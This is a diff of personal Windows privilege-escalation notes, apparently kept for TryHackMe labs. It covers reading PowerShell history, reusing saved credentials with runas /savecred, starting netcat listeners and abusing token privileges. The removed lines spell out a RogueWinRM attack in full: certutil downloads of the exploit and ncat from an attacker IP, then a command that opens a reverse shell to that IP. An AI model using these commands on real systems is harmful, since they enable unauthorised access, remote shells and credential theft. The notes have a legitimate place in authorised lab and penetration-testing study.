@@ -23,8 +23,9 @@ Powershell history
 	cmd: `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
 	ps: `type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
 
-Interesting files
+Other interesting files
 	`\windows\win.ini`
+	sam
 
 Saved credentials
 	cmd/ps: `cmdkey /list` no passwords, but can be used with `runas /savecred /user:admin cmd.exe`
@@ -107,7 +108,11 @@ Services
 		start a listener (`nc -lvnp 443`)
 		ps: `Restart-Service -Name THMService -Force`
 		cmd: `net stop "SERVICE-NAME" && net start THMService`
-	
+
+Check your current integrity level with
+	`whoami /groups`
+	more info https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/integrity-levels
+
 Privileges
 	`whoami /priv` shows only current ones, not the admin mode ones (like being in the backup group ones)
 	`whoami /all` to see groups too as we probably have to open cmd as admin to get all privileges
@@ -128,28 +133,16 @@ Privileges
 		Lock the console and press `Win+U`
 	if `SeImpersonate` or `SeAssignPrimaryToken`
 		Account with these privs: `LOCAL SERVICE`, `NETWORK SERVICE ACCOUNTS`, `iis apppool\defaultapppool`, others?
-		1. spawn a process with ^ that users can connect and authenticate to
-		2. force privileged users to connect and authenticate
-		Upload RogueWinRM exploit https://github.com/antonioCoco/RogueWinRM
-		The story https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/
-		`RogueWinRM.exe -p C:\windows\system32\cmd.exe` for interactive cmd
-		`RogueWinRM.exe -p C:\windows\temp\nc64.exe -a "10.0.0.1 3001 -e cmd"` for nc reverse shell
-		if webshell - looking for writeable dir on iis
-			looking for dir where iis account has write: `C:\Windows\Microsoft.NET\Framework\<version>\Temporary ASP.NET Files\`
-			`cd C:\Windows\Microsoft.NET\Framework\ && dir`
-			`cd "C:\Windows\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files" && dir`
-			`c:\windows\temp` might also work
-		 `certutil -urlcache -split -f "http://10.18.21.236:8000/exploits/RogueWinRM.exe" "C:\Windows\temp\RogueWinRM.exe"`
-		 `certutil -urlcache -split -f "http://10.18.21.236:8000/tools/ncat.exe" "C:\Windows\temp\ncat.exe"`
-		`C:\Windows\temp\RogueWinRM.exe -p "C:\windows\temp\ncat.exe" -a "-e cmd.exe 10.18.21.236 443"`
-		(since this starts the bits service there will be a delay of about 2 min until you can run this successfully again)
-https://www.exploit-db.com/papers/42556
-SeTcbPrivilege
-SeRestorePrivilege
-SeCreateTokenPrivilege
-SeLoadDriverPrivilege
-SeDebugPrivilege
-play with these on thm alfred
+		Exploit this by:
+			1. spawn a process with ^ that users can connect and authenticate to
+			2. force privileged users to connect and authenticate
+	https://www.exploit-db.com/papers/42556
+	SeTcbPrivilege
+	SeRestorePrivilege
+	SeCreateTokenPrivilege
+	SeLoadDriverPrivilege
+	SeDebugPrivilege
+	play with these on thm alfred
 
 
 Installed/unpatched software
